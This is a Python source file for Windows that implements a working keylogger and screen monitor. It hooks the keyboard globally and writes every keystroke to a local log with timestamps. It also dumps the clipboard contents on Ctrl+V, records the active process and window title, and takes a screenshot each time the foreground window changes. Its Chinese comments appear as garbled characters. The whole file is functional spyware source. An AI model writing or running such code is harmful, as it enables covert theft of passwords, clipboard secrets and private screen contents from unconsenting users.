# coding:gbk
__author__ = 'm9Kun'
__blog__ = 'm9kun.com'
from ctypes import *
import pythoncom
import pyHook
import win32clipboard
import win32gui
import win32ui
import win32con
import win32api
import time
import os
import os.path
from PIL import Image
import sys


def restart_program():  # ��������
    python = sys.executable
    os.execl(python, python, *sys.argv)


def window_capture(dpath):
    '''''
��������,���÷���window_capture('d:\\') ,����Ϊָ�������Ŀ¼
����ͼƬ�ļ���,�ļ�����ʽ:����.jpg ��:2009328224853.jpg
    '''
    hwnd = 0
    hwndDC = win32gui.GetWindowDC(hwnd)
    mfcDC = win32ui.CreateDCFromHandle(hwndDC)
    saveDC = mfcDC.CreateCompatibleDC()
    saveBitMap = win32ui.CreateBitmap()
    MoniterDev = win32api.EnumDisplayMonitors(None, None)
    w = MoniterDev[0][2][2]
    h = MoniterDev[0][2][3]
    # print w,h��������ͼƬ��С
    saveBitMap.CreateCompatibleBitmap(mfcDC, w, h)
    saveDC.SelectObject(saveBitMap)
    saveDC.BitBlt((0, 0), (w, h), mfcDC, (0, 0), win32con.SRCCOPY)
    time_temp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
    a1 = str(time_temp)[0:4]
    a2 = str(time_temp)[5:7]
    a3 = str(time_temp)[8:10]
    a4 = str(time_temp)[11:13]
    a5 = str(time_temp)[14:16]
    a6 = str(time_temp)[17:19]
    now_time = (a1 + a2 + a3 + a4 + a5 + a6)
    bmpname = now_time + '.bmp'
    saveBitMap.SaveBitmapFile(saveDC, bmpname)
    Image.open(bmpname).save(bmpname[:-4] + ".jpg")
    os.remove(bmpname)
    jpgname = bmpname[:-4] + '.jpg'
    djpgname = dpath + jpgname
    copy_command = "move %s %s" % (jpgname, djpgname)
    os.popen(copy_command)
    return bmpname[:-4] + '.jpg'


user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi
current_window = None


def get_current_process():
    time_temp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
    with open('.//Monitor//log.txt', 'a') as f:
        # ��ȡ���ϲ�Ĵ��ھ��
        hwnd = user32.GetForegroundWindow()
        # ��ȡ����id
        pid = c_ulong(0)
        user32.GetWindowThreadProcessId(hwnd, byref(pid))
        # ������id���������
        process_id = '%s' % pid.value
        # �����ڴ�
        executable = create_string_buffer('\x00' * 512)
        h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)
        psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)
        # ��ȡ���ڱ���
        windows_title = create_string_buffer('\x00' * 512)
        length = user32.GetWindowTextA(hwnd, byref(windows_title), 512)
        # ��ӡ
        a1 = '[PID:%s - %s - %s]' % (process_id, executable.value, windows_title.value)
        print(time_temp + ':' + a1 + '\r\n')
        f.write(time_temp + ':' + a1 + '\r\n')
        window_capture('.//Monitor//img//')
        # �ر�handles
        kernel32.CloseHandle(hwnd)
        kernel32.CloseHandle(h_process)


# ������������¼�����
def KeyStroke(event):
    global current_window
    time_temp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
    # a1 = str(time_temp)[0:4]
    # a2 = str(time_temp)[5:7]
    # a3 = str(time_temp)[8:10]
    # a4 = str(time_temp)[11:13]
    # a5 = str(time_temp)[14:16]
    # a6 = str(time_temp)[17:19]
    # now_time = (a1+a2+a3+a4+a5+a6)
    with open('.//Monitor//log.txt', 'a') as f:
        # ���Ŀ�괰���Ƿ�ת���������������ھͼ����µĴ��ڣ�
        if event.WindowName != current_window:
            current_window = event.WindowName
            # ��������
            get_current_process()

        # �������Ƿ񳣹水��������ϼ��ȣ�
        if event.Ascii > 32 and event.Ascii < 127:
            a2 = chr(event.Ascii)
            print(time_temp + ':[���水��] ' + a2 + '\r\n')
            f.write(time_temp + ':[���水��] ' + a2 + '\r\n')
        else:
            # �������Ctrl+v��ճ�����¼����Ͱ�ճ�������ݼ�¼����
            if event.Key == 'V':
                win32clipboard.OpenClipboard()
                pasted_value = win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()
                # �����ԭ���Ǹ��Ƶ�ʱ��ʹ�õ���Ӣ�����뷨��

                # ���������http://bbs.csdn.net/topics/80362400 [10¥]
                a3 = ' [����Ctrl+vճ���¼�,��������]\r\n%s' % pasted_value
                print(time_temp + a3 + '\r\n')
                f.write(time_temp + ':' + a3 + '\r\n')
            else:
                a4 = "[%s]" % event.Key
                print(time_temp + ':[���ⰴ��] ' + a4 + '\r\n')
                f.write(time_temp + ':[���ⰴ��] ' + a4 + '\r\n')
        # ѭ��������һ�������¼�
        return True


if not os.path.exists('.//Monitor//img'):
    os.makedirs('.//Monitor//img')
else:
    pass

# ������ע��hook������
kl = pyHook.HookManager()
kl.KeyDown = KeyStroke

# ע��hook��ִ��
kl.HookKeyboard()
pythoncom.PumpMessages()